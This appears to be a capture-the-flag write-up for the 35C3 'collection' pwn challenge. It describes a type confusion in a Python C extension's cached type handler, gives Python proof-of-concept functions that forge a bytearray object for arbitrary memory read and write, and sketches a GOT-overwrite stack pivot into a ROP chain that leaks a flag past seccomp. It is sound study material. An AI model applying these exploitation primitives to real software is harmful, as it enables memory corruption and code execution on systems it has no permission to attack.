For the 35C3 CTF I solved the challenge 'collection' (pwn/easy)

Although the vulnerability was very easy, it was difficult to find. There were a few reasons for this.

First, it required some knowledge about the Python-C-API
Second, there was another working vulnerability that discouraged me to look for the intended one.

To understand the vulnerability we must know a few structs defined. After reverse engineering the .so file containing the Collection module, I could know who it works.

The main structure used is the Collection structure. 

struct Collection{
	size_t ob_refcnt;
	PyTypeObject* type;
	type_handler* handler;
}

refcnt is a variable used for garbage collection. Although it was irrevelevant to the solution, there was a bug with refcnt.

struct type_handler{
	list* list;
	size_t refcnt;
}

refcnt has no importance, since it doesn't affect control flow.

struct list{
	node* head;
	node* tail;
	int size;
}

The list struct is allocated using malloc(8), so I thought this was a heap overflow vulnerability but it wasn't. Due to heap allignment only the prev_size of the next chunk was overwritten and I couldn't find a way to exploit this.

struct node{
	record* rec;
	node* next;
}

struct record{
	char* name;
	int type;
}

The Collection module provides a Collection() class which is like a container. The __init__ method takes a dictionary whose keys must be all strings and properties must be one of the following: list, dictionary, python int (long).

Each Collection() has a type_handler, which is used to list what types it contains. type_handler has a list where each node contains information (name, type)

Now, the vulnerability lies in the fact that type_handler is cached and can be used by other Collections if the types are equal. What do you mean by types are equal? It is defined in a function called IsListEqual, and a new type handler is generated only if there is no matching cached type handler. When judging if a type_handler can be used for a Collection, the order of the objects do not matter. However when using the get() method to take out objects it matters, because based on what type an object is the extraction method differs. If we can make an object take a type_handler that is different from its types we can cause unexpected behavior to occur.

Below is the PoC. Let's think about how it's supposed to work.

def arbitrary_read(addr,start,end):
	fakestruct = p64(0xff)+p64(0x9ce7e0)+p64(0x200)+p64(0x201)+p64(addr)*2
	structaddr = id(fakestruct) + 0x48
	#print("[*] target: 0x%x"%addr)
	c1 = Collection.Collection({"a":[],"a\x00":structaddr})
	c2 = Collection.Collection({"a":structaddr,"a\x00":[]})#INT->LIST
	x = c2.get("a")#GET ARBITRARY ADDRESS AS AN OBJECT
	return x[start:end]

def arbitrary_write(addr,offset,ch):
	fakestruct = p64(0xff)+p64(0x9ce7e0)+p64(0x200)+p64(0x201)+p64(addr)*2
	structaddr = id(fakestruct) + 0x48
	#print("[*] target: 0x%x"%addr)
	c1 = Collection.Collection({"a":[],"a\x00":structaddr})
	c2 = Collection.Collection({"a":structaddr,"a\x00":[]})#INT->LIST
	x = c2.get("a")#GET ARBITRARY ADDRESS AS AN OBJECT
	x[offset]=ch

using the collection module we could obtain arbitrary RW.

PyObject * Collection__get(PyObject *self, PyObject *args)
{
  char *v4; // rsi
  signed int idx; // eax
  int i; // rcx
  node *nn; // rdx
  record *v8; // rdx
  void *result; // rax
  char *name; // [rsp+0h] [rbp-18h]
  unsigned __int64 v11; // [rsp+8h] [rbp-10h]

  if ( !PyArg_ParseTuple(args, "s", &name) || self->ob_type != &module && !PyType_IsSubtype() )

  {
    return &Py_NoneStruct;
  }

  _name = name;
  idx = listIndexOf(self->type_handler->list, name,recordNameComparator);

  if ( idx == -1 )
    return &Py_NoneStruct;

  cur = self->type_handler->list->head;
  if ( cur && idx > 0 )
  {
    i = 0;
    do
    {
      cur = cur->next;
      i++;
    }
    while ( cur && idx > i );
  }
  rec = (record *)cur->value;
  result = self->elements[idx];
  if ( rec->type == 1 )                          // integer
    result = (PyObject *)PyLong_FromLong(result);
  return result;
}

All PyLong objects are stored in C unsigned long form instead of the pointer to the PyObject struct. If we can get a PyLong entry to have a type other than 1, we can make the get() method return an arbitrary pointer. We can do this by creating a type_handler containing a int entry and a list entry. If we switch the order of them and re-create a Collection object it will use the same type_handler but using get() to take out the list will result in returning the value of the int as a pointer. We can get a full arbitrary RW by using bytearrays. There is a member in the bytearray struct that holds its buffer, and by forging a value for that member we can get arbitrary RW.

Now that we have an arbitrary RW primitive, what can we do?
The flag is located in fd 1023 and we only have readv, mmap, and write to load the contents and show it. However I decided to use readv and write because mmap had special constraints to it via seccomp. We cannot use a one_gadget because execve is forbidden. We need a ROP to call all those functions with carefully set arguments. How to we do ROP when there is no stack overflow? We pivot the stack to the heap.

My plan is to:

(1) Overwrite free_got with a mov rbp,rax;ret gadget -> changes RBP to a heap address
(2) Overwrite sem_post with a leave;ret gadget -> changes RSP to RBP (heap)
(3) Enjoy the ROP

sem_post is called in a Python routine where an object is deleted.
To trigger the free() I manually removed a large bytearray containing the ROP chain (del myarray).

The full exploit is in final.py
